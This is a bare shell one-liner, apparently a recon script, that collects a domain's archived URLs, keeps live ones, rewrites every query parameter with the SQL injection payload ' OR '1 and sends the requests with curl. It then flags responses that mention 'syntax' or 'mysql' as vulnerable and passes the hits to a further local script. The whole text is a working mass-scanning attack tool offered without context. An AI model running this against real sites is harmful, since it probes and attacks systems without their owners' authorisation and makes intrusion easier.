gau $1 | httpx -status-code -silent -threads 500 | grep 200 | awk '{print $1}' | grep "=" | sed 's/=.*/=/'| grep -v ".jpg\|.jpeg\|.gif\|.css\|.tif\|.tiff\|.png|.ttf\|.woff\|.woff2\|.ico\|.pdf\|.woff2\|.svg\|.js" | qsreplace "' OR '1" | anew >> targeturls.txt ; for i in $(cat targeturls.txt); do echo -n $i | python3 -c "import sys; from urllib.parse import unquote; print(unquote(sys.stdin.read()));" >> sql1; done ; for i in $(cat sql1); do curl --silent --path-as-is --insecure $i | grep -e "syntax\|mysql" && echo -e "\e[31m[-]Vulnerable To SQL\e[0m : $i" || echo -e "\e[32m[+]Not Vulnerable To SQL\e[0m  : $i";done | tee -a sql_vuln.txt; rm targeturls.txt sql1; cat sql_vuln.txt | grep [-] | awk '{print $5}' >> sqlurls.txt; rm sql_vuln.txt; ~/scripts/./sqlhtml.sh sqlurls.txt; rm sqlurls.txt
